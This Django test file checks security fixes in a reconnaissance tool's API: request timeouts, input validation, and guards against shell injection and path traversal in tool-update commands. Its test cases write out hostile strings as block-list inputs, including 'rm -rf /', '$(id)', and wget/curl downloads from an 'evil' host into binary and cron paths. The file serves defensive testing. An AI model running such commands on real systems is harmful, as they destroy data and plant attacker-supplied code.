"""OWASP A04-1 — the synchronous WHOIS-family tool endpoints must not block a web
worker unboundedly. The fix:
  * bound the Celery wait and return 504 on timeout (no indefinite worker hang);
  * validate input on ReverseWhois/DomainIPHistory BEFORE dispatching a task;
  * give the underlying viewdns.info fetches an explicit timeout.
"""
from unittest.mock import patch, MagicMock

from django.test import TestCase
from django.contrib.auth import get_user_model
from rest_framework.test import APIClient
from celery.exceptions import TimeoutError as CeleryTimeoutError

from Suricatoos import common_func


class ToolEndpointInputValidationTests(TestCase):
    def setUp(self):
        User = get_user_model()
        self.user = User.objects.create_user('tool_tester', password='x-irrelevant')
        self.client = APIClient()
        self.client.force_authenticate(self.user)

    @patch('api.views.query_reverse_whois')
    def test_reverse_whois_rejects_empty_without_dispatch(self, mock_task):
        resp = self.client.get('/api/tools/reverse/whois/')  # no lookup_keyword
        self.assertFalse(resp.data.get('status'))
        mock_task.apply_async.assert_not_called()

    @patch('api.views.query_ip_history')
    def test_domain_ip_history_rejects_invalid_without_dispatch(self, mock_task):
        resp = self.client.get('/api/tools/domain_ip_history?domain=not a domain!!')
        self.assertFalse(resp.data.get('status'))
        mock_task.apply_async.assert_not_called()

    @patch('api.views.query_whois')
    def test_whois_timeout_returns_504(self, mock_task):
        fake = MagicMock()
        fake.wait.side_effect = CeleryTimeoutError()
        mock_task.apply_async.return_value = fake
        resp = self.client.get('/api/tools/whois/?target=example.com')
        self.assertEqual(resp.status_code, 504)


class ToolCommandGuardTests(TestCase):
    """Onda 2 (#13) — UpdateTool/UninstallTool compõem comandos a partir de campos
    controlados por admin (update_command / install_command / github_clone_path).
    Estes guards impedem que um campo adulterado vire RCE via shell / injeção de path."""

    def test_has_shell_meta_flags_injection(self):
        from api.views import _has_shell_meta
        for bad in ['git pull; rm -rf /', 'a | b', 'x && y', '$(id)', '`id`',
                    'a > /etc/x', 'a < b', 'foo\nbar', 'a & b']:
            self.assertTrue(_has_shell_meta(bad), f'deveria bloquear: {bad!r}')

    def test_has_shell_meta_allows_plain_commands(self):
        from api.views import _has_shell_meta
        for ok in ['git pull', 'go install github.com/projectdiscovery/nuclei/v3@latest',
                   'pip install dnsvalidator', 'nuclei -update-templates', 'subfinder -up']:
            self.assertFalse(_has_shell_meta(ok), f'não deveria bloquear: {ok!r}')

    def test_safe_path_segment(self):
        from api.views import _is_safe_path_segment
        for ok in ['nuclei', 'sub-finder', 'tool_1', 'a.b']:
            self.assertTrue(_is_safe_path_segment(ok), f'deveria aceitar: {ok!r}')
        for bad in ['', '-rf', 'a/b', 'a;b', '../etc', 'a b', 'a$b']:
            self.assertFalse(_is_safe_path_segment(bad), f'deveria rejeitar: {bad!r}')

    def test_update_allowlist_blocks_arbitrary_binary(self):
        # #13 (revisão adversarial): shell=False não basta — um comando sem metacaractere
        # como 'wget ... -O /go/bin/httpx' ainda rodaria; o binário base tem de estar na allowlist.
        from api.views import _update_command_base, ALLOWED_UPDATE_BINARIES
        for bad in ['wget http://evil -O /go/bin/httpx', 'curl http://evil -o /etc/cron.d/x',
                    'rm -rf /var/www', 'bash /tmp/x']:
            self.assertNotIn(_update_command_base(bad), ALLOWED_UPDATE_BINARIES,
                             f'binário arbitrário não deveria ser permitido: {bad!r}')
        for ok in ['go install github.com/x/y@latest', 'git pull', 'nuclei -update',
                   'pip3 install netlas', '/usr/local/bin/subfinder -up']:
            self.assertIn(_update_command_base(ok), ALLOWED_UPDATE_BINARIES,
                          f'updater legítimo deveria ser permitido: {ok!r}')

    def test_contained_tool_path_blocks_traversal(self):
        # #13b (revisão adversarial): startswith é driblável por '..'; exige filho direto.
        from api.views import _is_contained_tool_path
        self.assertTrue(_is_contained_tool_path('/usr/src/github/nuclei'))
        for bad in ['/usr/src/github/../../../etc/nginx', '/usr/src/github/..',
                    '/usr/src/github', '/etc/nginx', '/usr/src/github/a;b',
                    '', '/usr/src/github/a/b']:
            self.assertFalse(_is_contained_tool_path(bad), f'deveria rejeitar: {bad!r}')


class ToolFetchTimeoutTests(TestCase):
    @patch('Suricatoos.common_func.requests.get')
    def test_reverse_whois_fetch_has_timeout(self, mock_get):
        mock_get.return_value = MagicMock(content=b'<html></html>')
        common_func.reverse_whois('example@example.com')
        self.assertIn('timeout', mock_get.call_args.kwargs)

    @patch('Suricatoos.common_func.requests.get')
    def test_ip_history_fetch_has_timeout(self, mock_get):
        mock_get.return_value = MagicMock(content=b'<html></html>')
        common_func.get_domain_historical_ip_address('example.com')
        self.assertIn('timeout', mock_get.call_args.kwargs)
